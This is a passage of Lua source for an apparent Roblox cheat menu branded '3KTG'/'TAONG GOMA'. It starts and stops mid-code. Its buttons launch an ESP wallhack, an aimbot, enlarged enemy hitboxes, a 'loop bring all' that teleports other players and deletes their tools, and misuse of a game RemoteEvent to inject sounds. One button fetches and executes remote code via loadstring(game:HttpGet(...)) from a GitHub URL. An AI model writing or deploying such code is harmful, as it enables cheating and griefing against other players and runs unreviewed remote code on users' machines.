inputBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
inputBox.Font = Enum.Font.SourceSansBold
inputBox.TextSize = 18
inputBox.ClearTextOnFocus = false

local toggleButton = Instance.new("TextButton", main)
toggleButton.Size = UDim2.new(0.5, 0, 0.2, 0)
toggleButton.Position = UDim2.new(0.25, 0, 0.7, 0)
toggleButton.Text = "OFF"
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
toggleButton.BackgroundTransparency = 1
toggleButton.Font = Enum.Font.SourceSansBold
toggleButton.TextSize = 24

local isOn = false
local soundName = "TG_SOUND_" .. tostring(math.random(1000,9999))

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"

		local id = inputBox.Text
		if id == "" then
			warn("No music ID entered")
			return
		end

		if remote then
			pcall(function()
				remote:FireServer("newSound", soundName, InjectTo, "rbxassetid://" .. id, 1, 1, true, 0)
				remote:FireServer("playSound", soundName)
			end)
		else
			warn("AC6 RemoteEvent not found")
		end
	else
		toggleButton.Text = "OFF"

		if remote then
			pcall(function()
				remote:FireServer("stopSound", soundName)
			end)
		end
	end
end)
end)

addMainMenuButton("ESP [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "ESP_Toggle_GUI"
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 100, 0, 35)
toggleButton.Position = UDim2.new(0, 20, 0, 120)
toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.Text = "ESP: ON"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextSize = 14
toggleButton.Parent = gui

local corner = Instance.new("UICorner", toggleButton)
corner.CornerRadius = UDim.new(0, 6)

--// Toggle State
local ESP_ENABLED = true
local ESPObjects = {}

--// Drawing Helpers
local function newLine()
	local line = Drawing.new("Line")
	line.Thickness = 2
	line.Color = Color3.fromRGB(255, 255, 255) -- Changed to white
	line.Visible = true
	return line
end

local function newText()
	local text = Drawing.new("Text")
	text.Size = 14
	text.Color = Color3.fromRGB(255, 255, 255)
	text.Center = true
	text.Outline = true
	text.Visible = true
	return text
end

local function clearESP(player)
	if ESPObjects[player] then
		for _, obj in pairs(ESPObjects[player]) do
			if obj.Remove then obj:Remove() end
		end
		ESPObjects[player] = nil
	end
end

--// Get 2D screen position of 3D part
local function getPartPos(part)
	if not part then return nil, false end
	local pos, visible = Camera:WorldToViewportPoint(part.Position)
	return Vector2.new(pos.X, pos.Y), visible
end

--// ESP Rendering
RunService.RenderStepped:Connect(function()
	if not ESP_ENABLED then
		for _, v in pairs(ESPObjects) do
			for _, obj in pairs(v) do
				obj.Visible = false
			end
		end
		return
	end

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			local char = player.Character
			local esp = ESPObjects[player]

			if not esp then
				esp = {
					HeadToTorso = newLine(),
					TorsoToLeftArm = newLine(),
					TorsoToRightArm = newLine(),
					TorsoToLeftLeg = newLine(),
					TorsoToRightLeg = newLine(),
					Name = newText(),
				}
				ESPObjects[player] = esp
			end

			local headPos, headVis = getPartPos(char:FindFirstChild("Head"))
			local torsoPos, torsoVis = getPartPos(char:FindFirstChild("HumanoidRootPart"))
			local laPos, laVis = getPartPos(char:FindFirstChild("LeftUpperArm") or char:FindFirstChild("Left Arm"))
			local raPos, raVis = getPartPos(char:FindFirstChild("RightUpperArm") or char:FindFirstChild("Right Arm"))
			local llPos, llVis = getPartPos(char:FindFirstChild("LeftUpperLeg") or char:FindFirstChild("Left Leg"))
			local rlPos, rlVis = getPartPos(char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg"))

			if headVis and torsoVis then
				esp.HeadToTorso.From = headPos
				esp.HeadToTorso.To = torsoPos
				esp.HeadToTorso.Visible = true
			else
				esp.HeadToTorso.Visible = false
			end

			if torsoVis and laVis then
				esp.TorsoToLeftArm.From = torsoPos
				esp.TorsoToLeftArm.To = laPos
				esp.TorsoToLeftArm.Visible = true
			else
				esp.TorsoToLeftArm.Visible = false
			end

			if torsoVis and raVis then
				esp.TorsoToRightArm.From = torsoPos
				esp.TorsoToRightArm.To = raPos
				esp.TorsoToRightArm.Visible = true
			else
				esp.TorsoToRightArm.Visible = false
			end

			if torsoVis and llVis then
				esp.TorsoToLeftLeg.From = torsoPos
				esp.TorsoToLeftLeg.To = llPos
				esp.TorsoToLeftLeg.Visible = true
			else
				esp.TorsoToLeftLeg.Visible = false
			end

			if torsoVis and rlVis then
				esp.TorsoToRightLeg.From = torsoPos
				esp.TorsoToRightLeg.To = rlPos
				esp.TorsoToRightLeg.Visible = true
			else
				esp.TorsoToRightLeg.Visible = false
			end

			if headVis then
				esp.Name.Position = Vector2.new(headPos.X, headPos.Y - 20)
				esp.Name.Text = player.Name
				esp.Name.Visible = true
			else
				esp.Name.Visible = false
			end
		end
	end
end)

--// Player leave cleanup
Players.PlayerRemoving:Connect(function(player)
	clearESP(player)
end)

--// Toggle Button
toggleButton.MouseButton1Click:Connect(function()
	ESP_ENABLED = not ESP_ENABLED
	toggleButton.Text = ESP_ENABLED and "ESP: ON" or "ESP: OFF"
end)
end)

addMainMenuButton("BIG HEAD [3KTG]", function()
	_G.HeadSize = 6 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.Head.Transparency = 0.4 v.Character.Head.BrickColor = BrickColor.new("Red") v.Character.Head.Material = "Neon" v.Character.Head.CanCollide = false v.Character.Head.Massless = true end) end end end end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PRESS Q TO FREECAM [3KTG]", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 60
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.15
local MAX_PITCH = 89

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false -- NEW: para pigilan extra input sa frame ng toggle

-- Helpers for movement direction
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end  -- forward
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end -- backward
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- Toggle freecam
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new() -- NEW: reset movement dir agad
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled
	end
end

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end -- NEW: block key presses sa toggle frame

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end -- NEW: block releases sa toggle frame

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false -- reset block flag after 1 frame
	end
	if not enabled then return end

	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

addMainMenuButton("AIMBOT ADJUSTABLE [3KTG]", function()
	--// CONFIG
getgenv().Environment = {
    FOVSettings = {
        Amount = 150,
        Visible = true,
        Color = Color3.fromRGB(255, 255, 255) -- White FOV
    },
    Aimbot = {
        Enabled = true,
        AimPart = "Head"
    }
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

--// CREATE FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Transparency = 1
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

--// UPDATE FOV CIRCLE POSITION
RunService.RenderStepped:Connect(function()
    Circle.Position = UIS:GetMouseLocation()
    Circle.Visible = Environment.FOVSettings.Visible
    Circle.Radius = Environment.FOVSettings.Amount
end)

--// AIMBOT FUNCTION
local function GetClosestPlayer()
    local closest, dist = nil, Environment.FOVSettings.Amount
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(Environment.Aimbot.AimPart) then
            local headPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character[Environment.Aimbot.AimPart].Position)
            if onScreen then
                local mag = (Vector2.new(headPos.X, headPos.Y) - UIS:GetMouseLocation()).Magnitude
                if mag < dist then
                    closest = player
                    dist = mag
                end
            end
        end
    end
    return closest
end

RunService.RenderStepped:Connect(function()
    if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            workspace.CurrentCamera.CFrame = CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                target.Character[Environment.Aimbot.AimPart].Position
            )
        end
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local FOVLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 140)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "TAONG GOMA AIMBOT" -- Custom Title
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = Frame

-- FOV text display
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.45, 0)
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
FOVLabel.TextSize = 14
FOVLabel.Font = Enum.Font.SourceSans
FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.Parent = Frame

-- Toggle button for Show/Hide
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.Text = "FOV: Visible"
ToggleButton.Parent = Frame

-- FOV slider logic
local dragging = false

local function updateFOV(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newFOV = math.floor(50 + percent * 400)
    Environment.FOVSettings.Amount = newFOV
    FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local percent = (UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateFOV(percent)
    end
end)

-- Toggle FOV visibility
ToggleButton.MouseButton1Click:Connect(function()
    Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
    if Environment.FOVSettings.Visible then
        ToggleButton.Text = "FOV: Visible"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    else
        ToggleButton.Text = "FOV: Hidden"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    end
end)

-- Initial setup
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

addMainMenuButton("FADED [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic", true))()
end)

addMainMenuButton("LOOP BRING ALL [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Variables
local loopEnabled = false
local originalPositions = {}

--// GUI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- all black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 6)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.4, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Text = "TAONG GOMA LOOP BRING ALL"
Title.TextColor3 = Color3.fromRGB(255, 255, 255) -- white

local StatusButton = Instance.new("TextButton", Frame)
StatusButton.Size = UDim2.new(1, 0, 0.6, 0)
StatusButton.Position = UDim2.new(0, 0, 0.4, 0)
StatusButton.Font = Enum.Font.SourceSansBold
StatusButton.TextSize = 20
StatusButton.Text = "OFF"
StatusButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black
StatusButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- white text

--// Toggle Function
StatusButton.MouseButton1Click:Connect(function()
    loopEnabled = not loopEnabled

    if loopEnabled then
        -- Save original positions
        originalPositions = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                originalPositions[plr.Name] = plr.Character.HumanoidRootPart.CFrame
            end
        end

        StatusButton.Text = "ON"
        StatusButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- green text
    else
        -- Return players to original positions
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local savedPos = originalPositions[plr.Name]
                if savedPos then
                    plr.Character.HumanoidRootPart.CFrame = savedPos
                end
            end
        end

        StatusButton.Text = "OFF"
        StatusButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- back to white text
    end
end)

--// Loop Bring All in Front
RunService.RenderStepped:Connect(function()
    if loopEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local targetPos = hrp.Position + (hrp.CFrame.LookVector * 5)

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                -- Remove tools
                plr.Backpack:ClearAllChildren()
                for _, tool in pairs(plr.Character:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool:Destroy()
                    end
                end

                -- Bring to front
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER SCANNER [3KTG]", function()
	--// TAONG GOMA PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "TAONG GOMA PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	PlayerButton.Font = Enum.Font.Gotham
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
		Btn.Font = Enum.Font.GothamBold
		Btn.TextSize = 14
		Btn.Text = text
		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("AIM VIEWER [3KTG]", function()
	--// TAONG GOMA AIM VIEWER //--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local AimViewerEnabled = false
local playerLines = {}
local lineDistance = 50 -- haba ng line (studs)

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 60)
Frame.Position = UDim2.new(0.4, 0, 0.05, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black bg
Frame.BorderSizePixel = 2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black title bg
Title.Text = "TAONG GOMA AIM VIEWER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255) -- white text
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Parent = Frame

local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(1, 0, 0, 35)
ToggleButton.Position = UDim2.new(0, 0, 0, 25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black bg
ToggleButton.Text = "Aim Viewer: OFF"
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- red text (off)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.TextSize = 18
ToggleButton.Parent = Frame

-- Function para gumawa ng line
local function createLine()
    local line = Drawing.new("Line")
    line.Thickness = 1.5
    line.Transparency = 1
    line.Color = Color3.fromRGB(0, 0, 0) -- black line
    return line
end

-- Toggle function
ToggleButton.MouseButton1Click:Connect(function()
    AimViewerEnabled = not AimViewerEnabled
    if AimViewerEnabled then
        ToggleButton.Text = "Aim Viewer: ON"
        ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- green kapag on
    else
        ToggleButton.Text = "Aim Viewer: OFF"
        ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- red kapag off
        for _, line in pairs(playerLines) do
            line.Visible = false
        end
    end
end)

-- Main loop
RunService.RenderStepped:Connect(function()
    if AimViewerEnabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if not playerLines[plr] then
                    playerLines[plr] = createLine()
                end
                local line = playerLines[plr]
                local char = plr.Character
                if char and char:FindFirstChild("Head") then
                    local head = char.Head
                    local startPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    local endPos = head.Position + (head.CFrame.LookVector * lineDistance)
                    local endScreen, onScreen2 = Camera:WorldToViewportPoint(endPos)
                    if onScreen or onScreen2 then
                        line.From = Vector2.new(startPos.X, startPos.Y)
                        line.To = Vector2.new(endScreen.X, endScreen.Y)
                        line.Visible = true
                    else
                        line.Visible = false
                    end
                else
                    line.Visible = false
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HEAD DETECTOR [3KTG]", function()
	-- Local Anti-Headshot Detection GUI (Client-Side)
-- Detects if someone is aiming at your head
-- With ON/OFF toggle button + Hotkey (G)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- SETTINGS
local FOV_THRESHOLD = 5 -- degrees: smaller = stricter
local UPDATE_INTERVAL = 0.2 -- seconds
local detectionEnabled = true -- toggle state

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AntiHeadshotGUI"
ScreenGui.Parent = game.CoreGui

-- Main Frame
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(1, -310, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0

